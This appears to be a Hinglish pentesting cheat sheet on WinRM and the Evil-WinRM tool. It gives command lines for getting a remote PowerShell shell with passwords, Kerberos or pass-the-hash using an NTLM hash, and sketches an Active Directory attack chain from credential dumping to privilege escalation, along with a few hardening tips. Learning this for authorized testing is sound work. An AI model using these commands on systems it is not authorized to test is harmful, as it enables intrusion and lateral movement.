# 🟢 What is WinRM?

**WinRM (Windows Remote Management)** Microsoft ka remote management protocol hai.

👉 Ye allow karta hai:

- Remote command execution  
- PowerShell remoting  
- Centralized administration  

📡 Based on: **WS-Management (WS-Man)**  
📦 Works over: **HTTP / HTTPS**

---

# 🔑 Default WinRM Ports

| Protocol | Port | Encryption |
|----------|------|-----------|
| HTTP     | 5985 | Message-level encryption |
| HTTPS    | 5986 | TLS encryption |

⚠️ Real-world pentesting me agar **5985 / 5986 open mile → WinRM likely enabled**

---

# 🛠 Enable WinRM (On Target Windows)

## 1️⃣ Enable PowerShell Remoting

    Enable-PSRemoting -Force

✔ Ye automatically:
- WinRM service start karta hai  
- Listener create karta hai  
- Firewall rules add karta hai  

---

## 2️⃣ Check Service Status

    Get-Service WinRM

---

## 3️⃣ Check Listener

    winrm enumerate winrm/config/listener

---

## 4️⃣ Test Connectivity

    Test-WSMan <TargetIP>

---

# 🟣 What is Evil-WinRM?

💀 **Evil-WinRM** ek offensive tool hai jo WinRM ke through remote PowerShell shell deta hai.

### 🔥 Use Cases:

- Post exploitation  
- Active Directory lateral movement  
- Pass-the-Hash attacks  

---

# 📦 Install Evil-WinRM (Kali Linux)

## Using RubyGems

    gem install evil-winrm

## Manual Install

    git clone https://github.com/Hackplayers/evil-winrm.git
    cd evil-winrm
    gem install bundler
    bundle install

---

# 🚀 Basic Usage

    evil-winrm -i <target_ip> -u <username> -p <password>

### Example:

    evil-winrm -i 192.168.29.41 -u Administrator -p Password123

---

# 🔐 Kerberos Authentication

    evil-winrm -i 192.168.29.41 -u Administrator -k

---

# 🔑 Pass-the-Hash (Very Important 🔥)

    evil-winrm -i 192.168.29.41 -u Administrator -H <NTLM_hash>

👉 Password ki zarurat nahi  
👉 Sirf NTLM hash se login  

⚡ Yehi hota hai **Pass-the-Hash attack**

---

# 🌐 Use HTTPS (5986)

    evil-winrm -i 192.168.29.41 -u Administrator -p Password123 -S

---

# 🧠 Execute Single Command

    evil-winrm -i 192.168.29.41 -u Administrator -p Password123 -x "systeminfo"

---

# 📜 Run PowerShell Script

    evil-winrm -i 192.168.29.41 -u Administrator -p Password123 -s script.ps1

---

# 💻 After Successful Login

Interactive PowerShell shell milta hai:

    *Evil-WinRM* PS C:\Users\Administrator>

### Exit:

    exit

---

# 🔐 Security Best Practices (Defensive Side)

✔ Use HTTPS (5986)  
✔ Prefer Kerberos in domain environment  
❌ Avoid Basic Authentication  
✔ Restrict firewall access  
✔ Limit admin users  

---

# 🎯 Pentesting Scenario Example

Agar:

- Nmap me 5985 open ho  
- Valid domain credentials mil jaye  
- Ya NTLM hash mil jaye  

👉 To direct shell mil sakta hai:

    evil-winrm -i 192.168.29.41 -u ankit -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99

---

# 💥 Important AD Attack Flow

1️⃣ Nmap scan  
2️⃣ SMB enumeration  
3️⃣ Credential dump  
4️⃣ NTLM hash mil gaya  
5️⃣ Evil-WinRM → Shell access  
6️⃣ Privilege escalation  

---

# 🚀 Next Steps (Optional Learning)

Agar chaho to next ye cover kar sakte hain:

- 🔥 Complete AD attack chain diagram  
- 🔥 WinRM detection + exploitation lab setup  
- 🔥 Pass-the-Hash deep explanation with flow  
